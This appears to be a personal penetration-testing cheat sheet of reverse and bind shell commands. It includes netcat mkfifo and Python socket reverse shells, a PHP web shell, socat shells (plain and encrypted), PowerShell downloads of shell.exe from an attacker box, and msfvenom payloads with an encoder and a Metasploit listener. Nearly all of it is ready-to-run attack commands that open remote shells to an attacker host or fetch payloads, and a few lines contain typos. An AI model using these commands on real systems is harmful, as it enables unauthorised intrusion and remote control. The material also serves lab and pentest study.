# Shells

## Introduction

# Shell Stablisation Methods


Netcat shell stablisation
```bash
//python trick
//python2|3 remember!
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterml
CTRL+Z
stty raw -echo; fg
```
OR
```bash
//rlwrap trick
sudo apt install rlwrap
rlwrap nc -lvnp <port>
```
OR

//stepto-socat trick
```bash
sudo python3 -m http.server 80
wget <local-ip>/socat -0 /tmp/socat
````
!!IF WINDOWS
```powershell
Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

# Shells

## Linux Shells

bash nc -e workaround
```bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

python

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ip", port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);`

'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f")'
```
php
```php
file "<?php system($_GET['cmd']);?>"
"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ip/port 0>&1'");?>"
```

## Windows 

[windows php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)


# Shells 101

A shell is command line or grapical user interface of a system, the outermost layer to interact with it.

Quick useful list of linux networking commands help
```bash
ipconfig
ip 
systemctl <start/stop> <service>

wget http://
curl http://

```

Quick useful list of windows networking commands help

```powershell

powershell -c "Invoke-WebRequest -Uri http://$attackbox:$port/shell.exe" -outfile shell.exe
# or with powershell:
(new-object system.net.webclient).downloadfile("http://$attackbox:$port/shell.exe", "destination")
```

## Bind and Reverse Shells Defined:

Bind DEFINE: opposite to a reverse shell. The listener is on the target machine.

Reverse DEFINE: opposite to a bind shell. The listener is on the attacker machine.


## Netcat

### Connecting
-n skips dns name resolution
-v verbose

```bash
nc -nv <IP> 
```
### Listening
-l create listener
-p listen port
-n skips dns name resolution
-v verbose
```bash
nc -lvnp <IP> <PORT>
```
### Bind shell

```powershell
nc -nlvp 4444 -e cmd.exe
```
### Remote Administration
Alot of machines do not support -e option for obvious security reasons
```
-e bash
-e cmd.exe
```
Kali linux and general -e explainations:
{toogle}```
Kali linux has nc compiled with the flag:
`-DGAPING_SECURITY_HOLE` and enabled -e option unlike MOST modern Linux/BSD system DON'T SUPPORT -e; WHY?
-e Option can redirect 
       the input, output, 
               and error messages of an 
                   executable to a TCP/UDP port rather than the default console.
```
Receive files with nc and redirect output to file
```powershell
nc -lvnp port > incoming.exe
C:\Users\offsec> incoming.exe -h
```

Transfer files to windows
```bash
locate wget.exe
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```
## Socat 
Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features.

[socat](https://linux.die.net/man/1/socat)

Socat requires:
1. "-" to transfer data between STDIO and remote host
1. protocol name
1. Any protocols, options, port ARE colon delimited

```bash
socat - TCP4:<remoteIP>:PORT

socat TCP4-LISTEN:8080 STDOUT

socat TCP4:ip:port EXEC:/bin/bash
```

### Reverse Shells
Start a listener:
```bash
socat TCP-L:<PORT> -                                 # connect regardless with '-'
socat -d -d TCP-LISTEN:8080 STDOUT                   # -d -d = increase verbosity of output#
socat TCP4-LISTEN:8080,fork file:filename.txt,create # create specifies that a new file will be created.
                                                     # fork create a child process once connection is made to the listener(multiple connections allowed)
```
Connect to reverse Shell:

```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### Bind Shells

Start a bind listener
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
Connect to target regardless:
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Shell stablisation
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
[CTRL+Z]
stty raw -echo; fg 
```

### SPECIAL upload precompiled socat binary 
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to "normalise" it

### ENCRYPTING SHELLS
 
Generate a Certificate
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
```
req indicates that this is a certificate signing request. 
-x509 specifies that we want an X.509 certificate
-newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size(Optional sizes!) being 4096 bits. 
-days 365 shows that the validity of our certificate will be one year
-subj sets data, such as organization and country, via the command-line.
-nodes simplifies our command and does not encrypt the private key
-keyout `PRIVATE\_KEY` specifies the filename where we want to save our private key
-out CERTIFICATE specifies the filename to which we want to write the certificate request

Merge the two files:
```bash
cat shell.key shell.crt > shell.pem
```
Setup reverse shell listener
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # verify=0 means dont bother trying to validate cert
```
The same for bind shell
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # For windows after:" ,verify=0 EXEC='cmd.exe' "
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```bash
Socat listener and conection on windows
```bash
socat.exe -d OPENSSL-LISTEN:5678,cert=<cert>, verify=0 STDOUT, bind=127.0.0.1
socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe
```

## SSH

Flags:
```bash
-i      access with private key
-L      local_port:remote_address:remote_port # for local port fowarding
-R      port:loca_address:local_port # For remote port forwarding 
-D      local_PORT # Dynamic port fowarding, creates sockets proxy on localhost
-N      Do not execute a remote command. Useful in for just forwardin ports
-p      port
```
Kali Config
`/etc/ssh/ssh_config`

ssh Server:
```bash
netstat -antp | grep sshd
systemctl enable ssh
systemctl disable ssh
```

## Remoting with Powershell

Generally you must be administrator to `Enable-PSRemoting`, and require configuration of TrustedHosts:  
```powershell
Get-ChildItem -path WSMan:\Localhost # Find the WSman:\
Set-Item wsman:\local\client\trustedhosts <remote-address>
```
Connecting 
```powershell
Invoke-Command -ComputerName <remote-address> -Scriptblock {  } - Credential <username> # to attempt to connect and execute a scriptblock
Enter-PSSession -ComputerName <remote-address> -Credential <username> # Establishes a remote shell
```

## PsExec

PsExec, a subtool of PsTools, itself a subset Sysinternals suite and can be used to establish remote Windows shells. 
Version  2.32 and above require -i
```powershell
psexec \\<remote-address> -u <username> -p <password> -i cmd # -i for interactive
```

## Evil-winrm

[git](https://github.com/Hackplayers/evil-winrm)
> The ultimate WinRM shell for hacking/pentesting

HELP:
```bash
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```
## MSFvenom and Metasploit
Nice links:
[The great g0tmi1k's payload creator](https://github.com/g0tmi1k/msfpc)
[Common One Liners by Frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
[six2dex's pentestbook](https://pentestbook.six2dez.com/exploitation/payloads)

MSFvemon 101
```bash
msfvenom -h # help
msfvenom --list payloads
msfvenom --list platforms
msfvenom --list formats
msfvenom -p  $payload --list=options 
msfvenom -p <PAYLOAD> <OPTIONS>

-p {<OS>/<arch>/<payload>}
#For example
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvemon -p linux/x86/shell/reverse_tcp -f elf -o shell.elf LHOST=<listen-IP> LPORT=<listen-port>
#Example of -a and --encoder
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o shell.exe
```

Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```
